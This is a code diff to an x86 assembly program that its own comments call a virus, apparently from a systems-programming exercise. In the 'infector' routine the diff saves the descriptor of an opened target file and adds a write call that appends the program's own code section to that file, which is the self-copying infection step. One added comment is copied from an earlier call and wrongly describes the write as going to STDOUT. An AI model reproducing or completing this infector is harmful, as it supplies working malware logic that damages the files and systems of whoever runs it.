@@ -19,6 +19,9 @@ section .data
     file_error_message db "Error file", 0;
     file_error_length equ $ - file_error_message
 
+section .bss
+    file_descriptor resb 4     ; Space to store the file descriptor
+
 section .text
 
 extern strncmp
@@ -102,6 +105,8 @@ infector:
     test eax, eax
     jz error
 
+    mov [file_descriptor], eax ; Save the file descriptor
+
     ; Write the virus code at the end of the file
     mov eax, syscall_write
     mov ebx, eax           ; File descriptor returned from open
@@ -113,6 +118,20 @@ infector:
     push eax                 ; Syscall number
     call system_call         ; Perform the system call: write(STDOUT, argv[i], strlen(argv[i]))
     add esp, 16              ; Clean up the stack
+
+    mov eax, syscall_write
+    mov ebx, [file_descriptor] ; File descriptor
+    lea ecx, [code_start]      ; Address of the code section
+    mov edx, code_end - code_start ; Length of the code section
+    push edx                 ; Length of argument
+    push ecx                 ; Address of argument
+    push ebx                 ; File descriptor
+    push eax                 ; Syscall number
+    call system_call         ; Perform the system call: write(STDOUT, argv[i], strlen(argv[i]))
+    add esp, 16              ; Clean up the stack
+
+    cmp eax, 0
+    jle error
 
     ; Close the file
     mov eax, syscall_close
